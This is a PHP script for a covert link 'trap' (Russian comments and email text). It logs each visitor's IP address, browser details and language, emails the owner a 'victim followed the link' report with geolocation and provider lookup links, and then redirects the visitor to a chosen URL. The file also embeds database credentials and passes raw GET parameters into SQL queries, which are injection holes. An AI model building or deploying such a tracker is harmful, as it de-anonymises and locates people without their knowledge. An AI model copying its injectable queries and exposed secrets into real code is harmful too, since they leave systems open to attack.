<?php 
/* include("blocks/bd.php"); */


	if(!($db = mysqli_connect('vkonta19.mysql.ukraine.com.ua', 'vkonta19_db', 'PWxNmUKn','vkonta19_db')))
	{
		echo "<p>Ошибка при подключении к базе данных. Оповестите пожалуйста администратора.</p>";
		exit();
	}
	mysqli_query($db,"SET NAMES utf8"); 




	$date = date("Y-m-d H:i:s");
	$idr = $_GET ['id'];
	$rout = $_GET ['rout'];
	$way = $_GET ['way'];
	
	//echo $_SERVER('REQUEST_URI');
	
	//проверяем 
	//echo $_SERVER['PHP_SELF'];
	//echo $way ;
	
	/*  if (!isset($_GET ['id']) and !isset($_GET ['way']) and !isset($_GET ['rout']) ) 
	{
		//Добавляем в базу запись 
		if(isset($_SERVER['HTTP_USER_AGENT']) && isset($_SERVER['REMOTE_ADDR']) )
		{
			//Заноосим данные в базу
			$result = mysqli_query($db,"insert into visitor (ip,room_id,sys_info,lang,time,url_to) values('{$_SERVER["REMOTE_ADDR"]}','1---','{$_SERVER["HTTP_USER_AGENT"]}','{$_SERVER["HTTP_ACCEPT_LANGUAGE"]}','{$date}','vk.com')");
			if($result == 'true')
			{
				//echo "<p>Запись успешно добавлена!</p>";
			}
			else
			{
				//"<p>Запись не добавлена!</p>";
			}
		}
		else
		{
			//echo "<p>Нет всей, категория не может быть добавлена в базу.</p>";
		}
		
		echo 'Нет пути для перенаправления';
		//header("HTTP/1.1 301 Moved Permanently");
		//header("Location: http://vk.com");
	}  */
	
//echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ;
	//echo $_SERVER['HTTP_REFERER'];

	
	// echo parse_url($url, PHP_URL_PATH);
	
	// $str = preg_replace("/[^0-9]/", '', $str); 
	 
		if (isset ($idr)) 
		{
			$result = mysqli_query($db," select * from rooms WHERE id='{$idr}' ");
		}
		else
		{
			$result = mysqli_query($db," select * from rooms WHERE  way='{$way}'");
		}

		/* if(!$result)
		{
			//echo "<p>Запрос на выборку данных не прошел. Напишите об этом администратору.</p>";
			//exit(mysqli_error($db));
		} */

		if(mysqli_num_rows($result) > 0)
		{
			
			$room = mysqli_fetch_array($result);
			$result->Close();
		}
		else
		{
			$result = mysqli_query($db," select * from rooms WHERE id='1' ");
			$room = mysqli_fetch_array($result);
			$result->Close();
			//echo $way.'jkljljkl';
			//echo "<p>В информации по запросу отсутствуют кортежи.</p>";
			//
			//exit();
			//echo 'w==='.$way;
		}

//Добавляем в базу запись 
		if(isset($_SERVER['HTTP_USER_AGENT']) && isset($_SERVER['REMOTE_ADDR']) and $room['id'] != 1 )
		{
		/*Заноосим данные в базу*/
			$result = mysqli_query($db,"insert into visitor (ip,room_id,sys_info,lang,time,url_to) values('{$_SERVER["REMOTE_ADDR"]}','{$room['id']}','{$_SERVER["HTTP_USER_AGENT"]}','{$_SERVER["HTTP_ACCEPT_LANGUAGE"]}','{$date}','{$room['url_to']}')");
			if($result == 'true')
			{
				//echo "<p>Ваша запись успешно добавлена!</p>";
			}
			else
			{
				//"<p>Ваша запись не добавлена!</p>";
			}
			
		/* Отправляем письмо на почту! */
			$message ="<table id='table900' bordercolor='#900' border='1' style='width:100%; border: 1px solid #900; '>
						<tr>
							<td>идентификатор  комнаты:</td>
							<td>ip жертвы:</td>
							<td>sys info:</td>
							<td>Язык интерфейса:</td>
							<td>Был перенаправлен:</td>
							<td>Время перехода</td>
						</tr>
						<tr>
							<td width='10%'>{$room['id']}</td>
							<td>
								{$_SERVER['REMOTE_ADDR']}
								<!-- <br><a target=\"_blank\" href=\"http://api.2ip.com.ua/provider.xml?ip={$_SERVER["REMOTE_ADDR"]}\" >Провайдер</a> -->
								
								<br><a  href=\"http://api.2ip.com.ua/provider.xml?ip={$_SERVER['REMOTE_ADDR']}\" onclick=\"window.open(this.href, 'windowName', 'width=500, height=500, left=340, top=64, scrollbars, resizable'); return false;\">Провайдер</a>
								<br><a onclick=\"window.open(this.href, 'windowName', 'width=500, height=500, left=340, top=64, scrollbars, resizable'); return false;\" href=\"http://api.2ip.com.ua/geo.xml?ip={$_SERVER['REMOTE_ADDR']}\">Местонахождение</a>
							</td>
							<td>{$_SERVER["HTTP_USER_AGENT"]}</td>
							<td>{$_SERVER['HTTP_ACCEPT_LANGUAGE']}</td>
							<td width='40%'>{$room['url_to']}</td>
							<td>{$date}</td>
							
						</tr>
						</table>
						";

			$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
			$headers .= "From: Ловушка -  ";
			
			mail($room['email'], "Жертва прошла  по ссылке, комната №".$room['id'], $message,
			$headers."IP-Паутина: my@ip.info"); 
		}
		else
		{
			//echo "<p>Не вся информация, категория не может быть добавлена в базу.</p>";
		}
		
	header("HTTP/1.1 301 Moved Permanently");
    header("Location: http://{$room['url_to']}");

?>
